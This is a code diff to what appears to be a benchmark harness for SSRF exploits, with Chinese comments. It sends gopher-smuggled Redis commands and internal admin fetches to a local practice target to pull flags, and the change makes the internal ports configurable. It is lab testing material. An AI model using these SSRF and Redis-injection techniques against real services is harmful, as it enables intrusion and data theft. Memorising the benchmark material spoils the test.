@@ -24,6 +24,23 @@ RANGE_PY = os.path.join(HERE, "live_target", "ssrf_range.py")
 BENCH = os.path.join(HERE, "ssrf_benchmark.json")
 PORT = "18190"
 
+# 内网服务端口：默认 6399/6401；靶场若因端口占用自动避让，下面 load_runtime() 会读回实际值。
+REDIS_PORT = 6399
+INTERNAL_PORT = 6401
+
+
+def load_runtime():
+    """读取靶场落盘的实际内网端口（ssrf_range.py 端口避让时生成）。"""
+    global REDIS_PORT, INTERNAL_PORT
+    path = os.path.join(HERE, "ssrf_runtime_%s.json" % PORT)
+    try:
+        with open(path, encoding="utf-8") as f:
+            rt = json.load(f)
+        REDIS_PORT = int(rt.get("redis_port", REDIS_PORT))
+        INTERNAL_PORT = int(rt.get("internal_port", INTERNAL_PORT))
+    except Exception:
+        pass  # 无 runtime 文件 → 用默认端口（正常路径）
+
 RE_FLAG = re.compile(r"flag\{[^}\x00-\x1f\x7f]{4,}\}|[A-Z][A-Z0-9]{2,15}\{[^}\x00-\x1f\x7f]{4,}\}",
                      re.IGNORECASE)
 
@@ -79,7 +96,7 @@ def exploit_redis(base, desc):
     cmd = resp_encode("KEYS", "*")
     for k in ("backup:flag", "flag", "secret", "flag:db", "backup"):
         cmd += resp_encode("GET", k)
-    body = ssrf(base, "ssrf_redis", gopher_url("127.0.0.1", 6399, cmd))
+    body = ssrf(base, "ssrf_redis", gopher_url("127.0.0.1", REDIS_PORT, cmd))
     found = RE_FLAG.findall(body)
     if found:
         return found
@@ -91,7 +108,7 @@ def exploit_redis(base, desc):
             seen.add(k)
             cmd += resp_encode("GET", k)
     if cmd:
-        body = ssrf(base, "ssrf_redis", gopher_url("127.0.0.1", 6399, cmd))
+        body = ssrf(base, "ssrf_redis", gopher_url("127.0.0.1", REDIS_PORT, cmd))
         return RE_FLAG.findall(body)
     return []
 
@@ -117,7 +134,7 @@ def exploit_cloud(base, desc):
 def exploit_internal(base, desc):
     """内网回环 admin 服务：经 fetch 代理转发（token 由代理注入）。"""
     found = []
-    for port in (6401, 6402, 8080):
+    for port in (INTERNAL_PORT, 6402, 8080):
         for path in ("/internal/flag", "/admin/flag", "/flag"):
             _, body = fetch(f"{base}/ssrf_internal/fetch?url="
                             + urllib.parse.quote(f"http://127.0.0.1:{port}{path}", safe=""))
@@ -144,6 +161,7 @@ def main():
         if not wait_ready(PORT):
             print("靶场未就绪", file=sys.stderr)
             return 1
+        load_runtime()  # 靶场端口避让时读回实际内网端口
         base = f"http://127.0.0.1:{PORT}"
         hit = 0
         for pid in sorted(doc):
